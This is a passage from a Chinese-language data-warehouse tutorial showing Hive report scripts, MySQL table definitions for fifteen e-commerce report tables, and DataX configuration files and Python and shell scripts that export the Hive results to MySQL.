as<br>recent_days</p><p>group by recent_days</p><p>)t2</p><p>on t1.recent_days=t2.recent_days;</p><p>“</p><p>case $1 in</p><p>“ads_activity_stats” )</p><p>hive -e “$ads_activity_stats”</p><p>;;</p><p>“ads_coupon_stats” )</p><p>hive -e “$ads_coupon_stats”</p><p>;;</p><p>“ads_new_buyer_stats” )</p><p>hive -e “$ads_new_buyer_stats”</p><p>;;</p><p>“ads_order_by_province” )</p><p>hive -e “$ads_order_by_province”</p><p>;;</p><p>“ads_page_path” )</p><p>hive -e “$ads_page_path”</p><p>;;</p><p>“ads_repeat_purchase_by_tm” )</p><p>hive -e “$ads_repeat_purchase_by_tm”</p><p>;;</p><p>“ads_sku_cart_num_top3_by_cate” )</p><p>hive -e “$ads_sku_cart_num_top3_by_cate”</p><p>;;</p><p>“ads_trade_stats” )</p><p>hive -e “$ads_trade_stats”</p><p>;;</p><p>“ads_trade_stats_by_cate” )</p><p>hive -e “$ads_trade_stats_by_cate”</p><p>;;</p><p>“ads_trade_stats_by_tm” )</p><p>hive -e “$ads_trade_stats_by_tm”</p><p>;;</p><p>“ads_traffic_stats_by_channel” )</p><p>hive -e “$ads_traffic_stats_by_channel”</p><p>;;</p><p>“ads_user_action” )</p><p>hive -e “$ads_user_action”</p><p>;;</p><p>“ads_user_change” )</p><p>hive -e “$ads_user_change”</p><p>;;</p><p>“ads_user_retention” )</p><p>hive -e “$ads_user_retention”</p><p>;;</p><p>“ads_user_stats” )</p><p>hive -e “$ads_user_stats”</p><p>;;</p><p>“all” )</p><p>hive -e<br>“$ads_activity_stats$ads_coupon_stats$ads_new_buyer_stats$ads_order_by_province$ads_page_path$ads_repeat_purchase_by_tm$ads_sku_cart_num_top3_by_cate$ads_trade_stats$ads_trade_stats_by_cate$ads_trade_stats_by_tm$ads_traffic_stats_by_channel$ads_user_action$ads_user_change$ads_user_retention$ads_user_stats”</p><p>;;</p><p>esac</p><p>（3）增加脚本执行权限</p><p>[atguigu@hadoop102 bin]$ chmod +x dws_to_ads.sh</p><p>（4）脚本用法</p><p>[atguigu@hadoop102 bin]$ dws_to_ads.sh all 2020-06-14</p><h2 id="第12章-报表数据导出"><a href="#第12章-报表数据导出" class="headerlink" title="第12章 报表数据导出"></a>第12章 报表数据导出</h2><p>为方便报表应用使用数据，需将ads各指标的统计结果导出到MySQL数据库中。</p><h3 id="MySQL建库建表"><a href="#MySQL建库建表" class="headerlink" title="MySQL建库建表"></a>MySQL建库建表</h3><h4 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h4><p>CREATE DATABASE IF NOT EXISTS gmall_report DEFAULT CHARSET utf8 COLLATE<br>utf8_general_ci;</p><h4 id="创建表"><a href="#创建表" class="headerlink" title="创建表"></a>创建表</h4><p><strong>1）各活动补贴率</strong></p><p>DROP TABLE IF EXISTS `ads_activity_stats`;</p><p>CREATE TABLE `ads_activity_stats` (</p><p>`dt` date NOT NULL COMMENT ‘统计日期’,</p><p>`activity_id` varchar(16) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL<br>COMMENT ‘活动ID’,</p><p>`activity_name` varchar(64) CHARACTER SET utf8 COLLATE utf8_general_ci NULL<br>DEFAULT NULL COMMENT ‘活动名称’,</p><p>`start_date` varchar(16) CHARACTER SET utf8 COLLATE utf8_general_ci NULL<br>DEFAULT NULL COMMENT ‘活动开始日期’,</p><p>`reduce_rate` decimal(16, 2) NULL DEFAULT NULL COMMENT ‘补贴率’,</p><p>PRIMARY KEY (`dt`, `activity_id`) USING BTREE</p><p>) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT =<br>‘活动统计’ ROW_FORMAT = Dynamic;</p><p><strong>2）各优惠券补贴率</strong></p><p>DROP TABLE IF EXISTS `ads_coupon_stats`;</p><p>CREATE TABLE `ads_coupon_stats` (</p><p>`dt` date NOT NULL COMMENT ‘统计日期’,</p><p>`coupon_id` varchar(16) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL<br>COMMENT ‘优惠券ID’,</p><p>`coupon_name` varchar(64) CHARACTER SET utf8 COLLATE utf8_general_ci NULL<br>DEFAULT NULL COMMENT ‘优惠券名称’,</p><p>`start_date` varchar(16) CHARACTER SET utf8 COLLATE utf8_general_ci NULL<br>DEFAULT NULL COMMENT ‘发布日期’,</p><p>`rule_name` varchar(64) CHARACTER SET utf8 COLLATE utf8_general_ci NULL<br>DEFAULT NULL COMMENT ‘优惠规则，例如满100元减10元’,</p><p>`reduce_rate` decimal(16, 2) NULL DEFAULT NULL COMMENT ‘补贴率’,</p><p>PRIMARY KEY (`dt`, `coupon_id`) USING BTREE</p><p>) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT =<br>‘优惠券统计’ ROW_FORMAT = Dynamic;</p><p><strong>3）新增交易用户统计</strong></p><p>DROP TABLE IF EXISTS `ads_new_buyer_stats`;</p><p>CREATE TABLE `ads_new_buyer_stats` (</p><p>`dt` date NOT NULL COMMENT ‘统计日期’,</p><p>`recent_days` bigint(20) NOT NULL COMMENT<br>‘最近天数,1:最近1天,7:最近7天,30:最近30天’,</p><p>`new_order_user_count` bigint(20) NULL DEFAULT NULL COMMENT ‘新增下单人数’,</p><p>`new_payment_user_count` bigint(20) NULL DEFAULT NULL COMMENT ‘新增支付人数’,</p><p>PRIMARY KEY (`dt`, `recent_days`) USING BTREE</p><p>) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT =<br>‘新增交易用户统计’ ROW_FORMAT = Dynamic;</p><p><strong>4）各省份订单统计</strong></p><p>DROP TABLE IF EXISTS `ads_order_by_province`;</p><p>CREATE TABLE `ads_order_by_province` (</p><p>`dt` date NOT NULL COMMENT ‘统计日期’,</p><p>`recent_days` bigint(20) NOT NULL COMMENT<br>‘最近天数,1:最近1天,7:最近7天,30:最近30天’,</p><p>`province_id` varchar(16) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL<br>COMMENT ‘省份ID’,</p><p>`province_name` varchar(16) CHARACTER SET utf8 COLLATE utf8_general_ci NULL<br>DEFAULT NULL COMMENT ‘省份名称’,</p><p>`area_code` varchar(16) CHARACTER SET utf8 COLLATE utf8_general_ci NULL<br>DEFAULT NULL COMMENT ‘地区编码’,</p><p>`iso_code` varchar(16) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT<br>NULL COMMENT ‘国际标准地区编码’,</p><p>`iso_code_3166_2` varchar(16) CHARACTER SET utf8 COLLATE utf8_general_ci NULL<br>DEFAULT NULL COMMENT ‘国际标准地区编码’,</p><p>`order_count` bigint(20) NULL DEFAULT NULL COMMENT ‘订单数’,</p><p>`order_total_amount` decimal(16, 2) NULL DEFAULT NULL COMMENT ‘订单金额’,</p><p>PRIMARY KEY (`dt`, `recent_days`, `province_id`) USING BTREE</p><p>) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT =<br>‘各地区订单统计’ ROW_FORMAT = Dynamic;</p><p><strong>5）用户路径分析</strong></p><p>DROP TABLE IF EXISTS `ads_page_path`;</p><p>CREATE TABLE `ads_page_path` (</p><p>`dt` date NOT NULL COMMENT ‘统计日期’,</p><p>`recent_days` bigint(20) NOT NULL COMMENT<br>‘最近天数,1:最近1天,7:最近7天,30:最近30天’,</p><p>`source` varchar(64) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL<br>COMMENT ‘跳转起始页面ID’,</p><p>`target` varchar(64) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL<br>COMMENT ‘跳转终到页面ID’,</p><p>`path_count` bigint(20) NULL DEFAULT NULL COMMENT ‘跳转次数’,</p><p>PRIMARY KEY (`dt`, `recent_days`, `source`, `target`) USING BTREE</p><p>) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT =<br>‘页面浏览路径分析’ ROW_FORMAT = Dynamic;</p><p><strong>6）各品牌复购率</strong></p><p>DROP TABLE IF EXISTS `ads_repeat_purchase_by_tm`;</p><p>CREATE TABLE `ads_repeat_purchase_by_tm` (</p><p>`dt` date NOT NULL COMMENT ‘统计日期’,</p><p>`recent_days` bigint(20) NOT NULL COMMENT ‘最近天数,7:最近7天,30:最近30天’,</p><p>`tm_id` varchar(16) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL<br>COMMENT ‘品牌ID’,</p><p>`tm_name` varchar(32) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT<br>NULL COMMENT ‘品牌名称’,</p><p>`order_repeat_rate` decimal(16, 2) NULL DEFAULT NULL COMMENT ‘复购率’,</p><p>PRIMARY KEY (`dt`, `recent_days`, `tm_id`) USING BTREE</p><p>) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT =<br>‘各品牌复购率统计’ ROW_FORMAT = Dynamic;</p><p><strong>7）各品类商品购物车存量topN</strong></p><p>DROP TABLE IF EXISTS `ads_sku_cart_num_top3_by_cate`;</p><p>CREATE TABLE `ads_sku_cart_num_top3_by_cate` (</p><p>`dt` date NOT NULL COMMENT ‘统计日期’,</p><p>`category1_id` varchar(16) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL<br>COMMENT ‘一级分类ID’,</p><p>`category1_name` varchar(64) CHARACTER SET utf8 COLLATE utf8_general_ci NULL<br>DEFAULT NULL COMMENT ‘一级分类名称’,</p><p>`category2_id` varchar(16) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL<br>COMMENT ‘二级分类ID’,</p><p>`category2_name` varchar(64) CHARACTER SET utf8 COLLATE utf8_general_ci NULL<br>DEFAULT NULL COMMENT ‘二级分类名称’,</p><p>`category3_id` varchar(16) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL<br>COMMENT ‘三级分类ID’,</p><p>`category3_name` varchar(64) CHARACTER SET utf8 COLLATE utf8_general_ci NULL<br>DEFAULT NULL COMMENT ‘三级分类名称’,</p><p>`sku_id` varchar(16) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL<br>COMMENT ‘商品id’,</p><p>`sku_name` varchar(128) CHARACTER SET utf8 COLLATE utf8_general_ci NULL<br>DEFAULT NULL COMMENT ‘商品名称’,</p><p>`cart_num` bigint(20) NULL DEFAULT NULL COMMENT ‘购物车中商品数量’,</p><p>`rk` bigint(20) NULL DEFAULT NULL COMMENT ‘排名’,</p><p>PRIMARY KEY (`dt`, `sku_id`, `category1_id`, `category2_id`,<br>`category3_id`) USING BTREE</p><p>) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT =<br>‘各分类商品购物车存量Top10’ ROW_FORMAT = Dynamic;</p><p><strong>8）交易综合统计</strong></p><p>DROP TABLE IF EXISTS `ads_trade_stats`;</p><p>CREATE TABLE `ads_trade_stats` (</p><p>`dt` date NOT NULL COMMENT ‘统计日期’,</p><p>`recent_days` bigint(255) NOT NULL COMMENT<br>‘最近天数,1:最近1日,7:最近7天,30:最近30天’,</p><p>`order_total_amount` decimal(16, 2) NULL DEFAULT NULL COMMENT ‘订单总额,GMV’,</p><p>`order_count` bigint(20) NULL DEFAULT NULL COMMENT ‘订单数’,</p><p>`order_user_count` bigint(20) NULL DEFAULT NULL COMMENT ‘下单人数’,</p><p>`order_refund_count` bigint(20) NULL DEFAULT NULL COMMENT ‘退单数’,</p><p>`order_refund_user_count` bigint(20) NULL DEFAULT NULL COMMENT ‘退单人数’,</p><p>PRIMARY KEY (`dt`, `recent_days`) USING BTREE</p><p>) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT =<br>‘交易统计’ ROW_FORMAT = Dynamic;</p><p><strong>9）各品类商品交易统计</strong></p><p>DROP TABLE IF EXISTS `ads_trade_stats_by_cate`;</p><p>CREATE TABLE `ads_trade_stats_by_cate` (</p><p>`dt` date NOT NULL COMMENT ‘统计日期’,</p><p>`recent_days` bigint(20) NOT NULL COMMENT<br>‘最近天数,1:最近1天,7:最近7天,30:最近30天’,</p><p>`category1_id` varchar(16) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL<br>COMMENT ‘一级分类id’,</p><p>`category1_name` varchar(64) CHARACTER SET utf8 COLLATE utf8_general_ci NULL<br>DEFAULT NULL COMMENT ‘一级分类名称’,</p><p>`category2_id` varchar(16) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL<br>COMMENT ‘二级分类id’,</p><p>`category2_name` varchar(64) CHARACTER SET utf8 COLLATE utf8_general_ci NULL<br>DEFAULT NULL COMMENT ‘二级分类名称’,</p><p>`category3_id` varchar(16) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL<br>COMMENT ‘三级分类id’,</p><p>`category3_name` varchar(64) CHARACTER SET utf8 COLLATE utf8_general_ci NULL<br>DEFAULT NULL COMMENT ‘三级分类名称’,</p><p>`order_count` bigint(20) NULL DEFAULT NULL COMMENT ‘订单数’,</p><p>`order_user_count` bigint(20) NULL DEFAULT NULL COMMENT ‘订单人数’,</p><p>`order_refund_count` bigint(20) NULL DEFAULT NULL COMMENT ‘退单数’,</p><p>`order_refund_user_count` bigint(20) NULL DEFAULT NULL COMMENT ‘退单人数’,</p><p>PRIMARY KEY (`dt`, `recent_days`, `category1_id`, `category2_id`,<br>`category3_id`) USING BTREE</p><p>) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT =<br>‘各分类商品交易统计’ ROW_FORMAT = Dynamic;</p><p><strong>10）各品牌商品交易统计</strong></p><p>DROP TABLE IF EXISTS `ads_trade_stats_by_tm`;</p><p>CREATE TABLE `ads_trade_stats_by_tm` (</p><p>`dt` date NOT NULL COMMENT ‘统计日期’,</p><p>`recent_days` bigint(20) NOT NULL COMMENT<br>‘最近天数,1:最近1天,7:最近7天,30:最近30天’,</p><p>`tm_id` varchar(16) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL<br>COMMENT ‘品牌ID’,</p><p>`tm_name` varchar(32) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT<br>NULL COMMENT ‘品牌名称’,</p><p>`order_count` bigint(20) NULL DEFAULT NULL COMMENT ‘订单数’,</p><p>`order_user_count` bigint(20) NULL DEFAULT NULL COMMENT ‘订单人数’,</p><p>`order_refund_count` bigint(20) NULL DEFAULT NULL COMMENT ‘退单数’,</p><p>`order_refund_user_count` bigint(20) NULL DEFAULT NULL COMMENT ‘退单人数’,</p><p>PRIMARY KEY (`dt`, `recent_days`, `tm_id`) USING BTREE</p><p>) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT =<br>‘各品牌商品交易统计’ ROW_FORMAT = Dynamic;</p><p><strong>11）各渠道流量统计</strong></p><p>DROP TABLE IF EXISTS `ads_traffic_stats_by_channel`;</p><p>CREATE TABLE `ads_traffic_stats_by_channel` (</p><p>`dt` date NOT NULL COMMENT ‘统计日期’,</p><p>`recent_days` bigint(20) NOT NULL COMMENT<br>‘最近天数,1:最近1天,7:最近7天,30:最近30天’,</p><p>`channel` varchar(16) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL<br>COMMENT ‘渠道’,</p><p>`uv_count` bigint(20) NULL DEFAULT NULL COMMENT ‘访客人数’,</p><p>`avg_duration_sec` bigint(20) NULL DEFAULT NULL COMMENT<br>‘会话平均停留时长，单位为秒’,</p><p>`avg_page_count` bigint(20) NULL DEFAULT NULL COMMENT ‘会话平均浏览页面数’,</p><p>`sv_count` bigint(20) NULL DEFAULT NULL COMMENT ‘会话数’,</p><p>`bounce_rate` decimal(16, 2) NULL DEFAULT NULL COMMENT ‘跳出率’,</p><p>PRIMARY KEY (`dt`, `recent_days`, `channel`) USING BTREE</p><p>) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT =<br>‘各渠道流量统计’ ROW_FORMAT = Dynamic;</p><p><strong>12）用户行为漏斗分析</strong></p><p>DROP TABLE IF EXISTS `ads_user_action`;</p><p>CREATE TABLE `ads_user_action` (</p><p>`dt` date NOT NULL COMMENT ‘统计日期’,</p><p>`recent_days` bigint(20) NOT NULL COMMENT<br>‘最近天数,1:最近1天,7:最近7天,30:最近30天’,</p><p>`home_count` bigint(20) NULL DEFAULT NULL COMMENT ‘浏览首页人数’,</p><p>`good_detail_count` bigint(20) NULL DEFAULT NULL COMMENT ‘浏览商品详情页人数’,</p><p>`cart_count` bigint(20) NULL DEFAULT NULL COMMENT ‘加入购物车人数’,</p><p>`order_count` bigint(20) NULL DEFAULT NULL COMMENT ‘下单人数’,</p><p>`payment_count` bigint(20) NULL DEFAULT NULL COMMENT ‘支付人数’,</p><p>PRIMARY KEY (`dt`, `recent_days`) USING BTREE</p><p>) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT =<br>‘漏斗分析’ ROW_FORMAT = Dynamic;</p><p><strong>13）用户变动统计</strong></p><p>DROP TABLE IF EXISTS `ads_user_change`;</p><p>CREATE TABLE `ads_user_change` (</p><p>`dt` varchar(16) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT<br>‘统计日期’,</p><p>`user_churn_count` varchar(16) CHARACTER SET utf8 COLLATE utf8_general_ci NULL<br>DEFAULT NULL COMMENT ‘流失用户数’,</p><p>`user_back_count` varchar(16) CHARACTER SET utf8 COLLATE utf8_general_ci NULL<br>DEFAULT NULL COMMENT ‘回流用户数’,</p><p>PRIMARY KEY (`dt`) USING BTREE</p><p>) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT =<br>‘用户变动统计’ ROW_FORMAT = Dynamic;</p><p><strong>14）用户留存率</strong></p><p>DROP TABLE IF EXISTS `ads_user_retention`;</p><p>CREATE TABLE `ads_user_retention` (</p><p>`dt` date NOT NULL COMMENT ‘统计日期’,</p><p>`create_date` varchar(16) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL<br>COMMENT ‘用户新增日期’,</p><p>`retention_day` int(20) NOT NULL COMMENT ‘截至当前日期留存天数’,</p><p>`retention_count` bigint(20) NULL DEFAULT NULL COMMENT ‘留存用户数量’,</p><p>`new_user_count` bigint(20) NULL DEFAULT NULL COMMENT ‘新增用户数量’,</p><p>`retention_rate` decimal(16, 2) NULL DEFAULT NULL COMMENT ‘留存率’,</p><p>PRIMARY KEY (`dt`, `create_date`, `retention_day`) USING BTREE</p><p>) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT =<br>‘留存率’ ROW_FORMAT = Dynamic;</p><p><strong>15）用户新增活跃统计</strong></p><p>DROP TABLE IF EXISTS `ads_user_stats`;</p><p>CREATE TABLE `ads_user_stats` (</p><p>`dt` date NOT NULL COMMENT ‘统计日期’,</p><p>`recent_days` bigint(20) NOT NULL COMMENT<br>‘最近n日,1:最近1日,7:最近7日,30:最近30日’,</p><p>`new_user_count` bigint(20) NULL DEFAULT NULL COMMENT ‘新增用户数’,</p><p>`active_user_count` bigint(20) NULL DEFAULT NULL COMMENT ‘活跃用户数’,</p><p>PRIMARY KEY (`dt`, `recent_days`) USING BTREE</p><p>) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT =<br>‘用户新增活跃统计’ ROW_FORMAT = Dynamic;</p><h3 id="数据导出"><a href="#数据导出" class="headerlink" title="数据导出"></a>数据导出</h3><p>数据导出工具选用DataX，选用HDFSReader和MySQLWriter。</p><h4 id="编写DataX配置文件"><a href="#编写DataX配置文件" class="headerlink" title="编写DataX配置文件"></a>编写DataX配置文件</h4><p>我们需要为每个张表编写一个DataX配置文件，此处以ads_traffic_stats_by_channel为例，配置文件内容如下：</p><p>{</p><p>“job”: {</p><p>“content”: [</p><p>{</p><p>“reader”: {</p><p>“name”: “hdfsreader”,</p><p>“parameter”: {</p><p>“column”: [</p><p>“*“</p><p>],</p><p>“defaultFS”: “hdfs://hadoop102:8020”,</p><p>“encoding”: “UTF-8”,</p><p>“fieldDelimiter”: “\t”,</p><p>“fileType”: “text”,</p><p>“nullFormat”: “\\N”,</p><p>“path”: “<strong>${exportdir}</strong>“</p><p>}</p><p>},</p><p>“writer”: {</p><p>“name”: “mysqlwriter”,</p><p>“parameter”: {</p><p>“column”: [</p><p>“dt”,</p><p>“recent_days”,</p><p>“channel”,</p><p>“uv_count”,</p><p>“avg_duration_sec”,</p><p>“avg_page_count”,</p><p>“sv_count”,</p><p>“bounce_rate”</p><p>],</p><p>“connection”: [</p><p>{</p><p>“jdbcUrl”:<br>“jdbc:mysql://hadoop102:3306/gmall_report?useUnicode=true&amp;characterEncoding=utf-8”,</p><p>“table”: [</p><p>“ads_traffic_stats_by_channel”</p><p>]</p><p>}</p><p>],</p><p>“password”: “000000”,</p><p>“username”: “root”,</p><p>“writeMode”: “replace”</p><p>}</p><p>}</p><p>}</p><p>],</p><p>“setting”: {</p><p>“errorLimit”: {</p><p>“percentage”: 0.02,</p><p>“record”: 0</p><p>},</p><p>“speed”: {</p><p>“channel”: 3</p><p>}</p><p>}</p><p>}</p><p>}</p><p>注：导出路径path参数并未写死，需在提交任务时通过参数动态传入，参数名称为exportdir。</p><h4 id="DataX配置文件生成脚本"><a href="#DataX配置文件生成脚本" class="headerlink" title="DataX配置文件生成脚本"></a>DataX配置文件生成脚本</h4><p>方便起见，此处提供了DataX配置文件批量生成脚本，脚本内容及使用方式如下。</p><p><strong>1）在~/bin目录下创建gen_export_config.py脚本</strong></p><p>[atguigu@hadoop102 bin]$ vim ~/bin/gen_export_config.py</p><p>脚本内容如下</p><p>## coding=utf-8</p><p>import json</p><p>import getopt</p><p>import os</p><p>import sys</p><p>import MySQLdb</p><p>##MySQL相关配置，需根据实际情况作出修改</p><p>mysql_host = “hadoop102”</p><p>mysql_port = “3306”</p><p>mysql_user = “root”</p><p>mysql_passwd = “000000”</p><p>##HDFS NameNode相关配置，需根据实际情况作出修改</p><p>hdfs_nn_host = “hadoop102”</p><p>hdfs_nn_port = “8020”</p><p>##生成配置文件的目标路径，可根据实际情况作出修改</p><p>output_path = “/opt/module/datax/job/export”</p><p>def get_connection():</p><p>return MySQLdb.connect(host=mysql_host, port=int(mysql_port), user=mysql_user,<br>passwd=mysql_passwd)</p><p>def get_mysql_meta(database, table):</p><p>connection = get_connection()</p><p>cursor = connection.cursor()</p><p>sql = “SELECT COLUMN_NAME,DATA_TYPE from information_schema.COLUMNS WHERE<br>TABLE_SCHEMA=%s AND TABLE_NAME=%s ORDER BY ORDINAL_POSITION”</p><p>cursor.execute(sql, [database, table])</p><p>fetchall = cursor.fetchall()</p><p>cursor.close()</p><p>connection.close()</p><p>return fetchall</p><p>def get_mysql_columns(database, table):</p><p>return map(lambda x: x[0], get_mysql_meta(database, table))</p><p>def generate_json(target_database, target_table):</p><p>job = {</p><p>“job”: {</p><p>“setting”: {</p><p>“speed”: {</p><p>“channel”: 3</p><p>},</p><p>“errorLimit”: {</p><p>“record”: 0,</p><p>“percentage”: 0.02</p><p>}</p><p>},</p><p>“content”: [{</p><p>“reader”: {</p><p>“name”: “hdfsreader”,</p><p>“parameter”: {</p><p>“path”: “${exportdir}”,</p><p>“defaultFS”: “hdfs://“ + hdfs_nn_host + “:” + hdfs_nn_port,</p><p>“column”: [“*“],</p><p>“fileType”: “text”,</p><p>“encoding”: “UTF-8”,</p><p>“fieldDelimiter”: “\t”,</p><p>“nullFormat”: “\\N”</p><p>}</p><p>},</p><p>“writer”: {</p><p>“name”: “mysqlwriter”,</p><p>“parameter”: {</p><p>“writeMode”: “replace”,</p><p>“username”: mysql_user,</p><p>“password”: mysql_passwd,</p><p>“column”: get_mysql_columns(target_database, target_table),</p><p>“connection”: [</p><p>{</p><p>“jdbcUrl”:</p><p>“jdbc:mysql://“ + mysql_host + “:” + mysql_port + “/“ + target_database +<br>“?useUnicode=true&amp;characterEncoding=utf-8”,</p><p>“table”: [target_table]</p><p>}</p><p>]</p><p>}</p><p>}</p><p>}]</p><p>}</p><p>}</p><p>if not os.path.exists(output_path):</p><p>os.makedirs(output_path)</p><p>with open(os.path.join(output_path, “.”.join([target_database, target_table,<br>“json”])), “w”) as f:</p><p>json.dump(job, f)</p><p>def main(args):</p><p>target_database = “”</p><p>target_table = “”</p><p>options, arguments = getopt.getopt(args, ‘-d:-t:’, [‘targetdb=’, ‘targettbl=’])</p><p>for opt_name, opt_value in options:</p><p>if opt_name in (‘-d’, ‘–targetdb’):</p><p>target_database = opt_value</p><p>if opt_name in (‘-t’, ‘–targettbl’):</p><p>target_table = opt_value</p><p>generate_json(target_database, target_table)</p><p>if _<em>name</em>_ == ‘<strong>main</strong>‘:</p><p>main(sys.argv[1:])</p><p><strong>注：</strong></p><p><strong>（1）安装Python Mysql驱动</strong></p><p><strong>由于需要使用Python访问Mysql数据库，故需安装驱动，命令如下：</strong></p><p>[atguigu@hadoop102 bin]$ sudo yum install -y MySQL-python</p><p><strong>（2）脚本使用说明</strong></p><p>python gen_export_config.py <strong>-d</strong> database <strong>-t</strong> table</p><p>通过-d传入MySQL数据库名，-t传入MySQL表名，执行上述命令即可生成该表的DataX同步配置文件。</p><p><strong>2）在~/bin目录下创建gen_export_config.sh脚本</strong></p><p>[atguigu@hadoop102 bin]$ vim ~/bin/gen_export_config.sh</p><p>脚本内容如下</p><p>##!/bin/bash</p><p>python ~/bin/gen_export_config.py -d gmall_report -t ads_activity_stats</p><p>python ~/bin/gen_export_config.py -d gmall_report -t ads_coupon_stats</p><p>python ~/bin/gen_export_config.py -d gmall_report -t ads_new_buyer_stats</p><p>python ~/bin/gen_export_config.py -d gmall_report -t ads_order_by_province</p><p>python ~/bin/gen_export_config.py -d gmall_report -t ads_page_path</p><p>python ~/bin/gen_export_config.py -d gmall_report -t ads_repeat_purchase_by_tm</p><p>python ~/bin/gen_export_config.py -d gmall_report -t<br>ads_sku_cart_num_top3_by_cate</p><p>python ~/bin/gen_export_config.py -d gmall_report -t ads_trade_stats</p><p>python ~/bin/gen_export_config.py -d gmall_report -t ads_trade_stats_by_cate</p><p>python ~/bin/gen_export_config.py -d gmall_report -t ads_trade_stats_by_tm</p><p>python ~/bin/gen_export_config.py -d gmall_report -t<br>ads_traffic_stats_by_channel</p><p>python ~/bin/gen_export_config.py -d gmall_report -t ads_user_action</p><p>python ~/bin/gen_export_config.py -d gmall_report -t ads_user_change</p><p>python ~/bin/gen_export_config.py -d gmall_report -t ads_user_retention</p><p>python ~/bin/gen_export_config.py -d gmall_report -t ads_user_stats</p><p><strong>3）为gen_export_config.sh脚本增加执行权限</strong></p><p>[atguigu@hadoop102 bin]$ chmod +x ~/bin/gen_export_config.sh</p><p><strong>4）执行gen_export_config.sh脚本，生成配置文件</strong></p><p>[atguigu@hadoop102 bin]$ gen_export_config.sh</p><p><strong>5）观察生成的配置文件</strong></p><p>[atguigu@hadoop102 bin]$ ls /opt/module/datax/job/export/</p><p>总用量 64</p><p>gmall_report.ads_activity_stats.json gmall_report.ads_trade_stats_by_cate.json</p><p>gmall_report.ads_coupon_stats.json gmall_report.ads_trade_stats_by_tm.json</p><p>gmall_report.ads_new_buyer_stats.json gmall_report.ads_trade_stats.json</p><p>gmall_report.ads_order_by_province.json<br>gmall_report.ads_traffic_stats_by_channel.json</p><p>gmall_report.ads_user_action.json</p><p>gmall_report.ads_page_path.json gmall_report.ads_user_change.json</p><p>gmall_report.ads_repeat_purchase_by_tm.json gmall_report.ads_user_retention.json</p><p>gmall_report.ads_sku_cart_num_top3_by_cate.json gmall_report.ads_user_stats.json</p><h4 id="测试生成的DataX配置文件"><a href="#测试生成的DataX配置文件" class="headerlink" title="测试生成的DataX配置文件"></a>测试生成的DataX配置文件</h4><p>以ads_traffic_stats_by_channel为例，测试用脚本生成的配置文件是否可用。</p><p><strong>1）执行DataX同步命令</strong></p><p>[atguigu@hadoop102 bin]$ python /opt/module/datax/bin/datax.py<br>-p”-Dexportdir=/warehouse/gmall/ads/ads_traffic_stats_by_channel”<br>/opt/module/datax/job/export/gmall_report.ads_traffic_stats_by_channel.json</p><p><strong>2）观察同步结果</strong></p><p>观察MySQL目标表是否出现数据。</p><h4 id="编写每日导出脚本"><a href="#编写每日导出脚本" class="headerlink" title="编写每日导出脚本"></a>编写每日导出脚本</h4><p>（1）在hadoop102的/home/atguigu/bin目录下创建hdfs_to_mysql.sh</p><p>[atguigu@hadoop102 bin]$ vim hdfs_to_mysql.sh</p><p>（2）编写如下内容</p><p>##! /bin/bash</p><p>DATAX_HOME=/opt/module/datax</p><p>##DataX导出路径不允许存在空文件，该函数作用为清理空文件</p><p>handle_export_path(){</p><p>for i in `hadoop fs -ls -R $1 | awk ‘{print $8}’`; do</p><p>hadoop fs -test -z $i</p><p>if [[ $? -eq 0 ]]; then</p><p>echo “$i文件大小为0，正在删除”</p><p>hadoop fs -rm -r -f $i</p><p>fi</p><p>done</p><p>}</p><p>##数据导出</p><p>export_data() {</p><p>datax_config=$1</p><p>export_dir=$2</p><p>handle_export_path $export_dir</p><p>$DATAX_HOME/bin/datax.py -p”-Dexportdir=$export_dir” $datax_config</p><p>}</p><p>case $1 in</p><p>“ads_new_buyer_stats”)</p><p>export_data /opt/module/datax/job/export/gmall_report.ads_new_buyer_stats.json<br>/warehouse/gmall/ads/ads_new_buyer_stats</p><p>;;</p><p>“ads_order_by_province”)</p><p>export_data /opt/module/datax/job/export/gmall_report.ads_order_by_province.json<br>/warehouse/gmall/ads/ads_order_by_province</p><p>;;</p><p>“ads_page_path”)</p><p>export_data 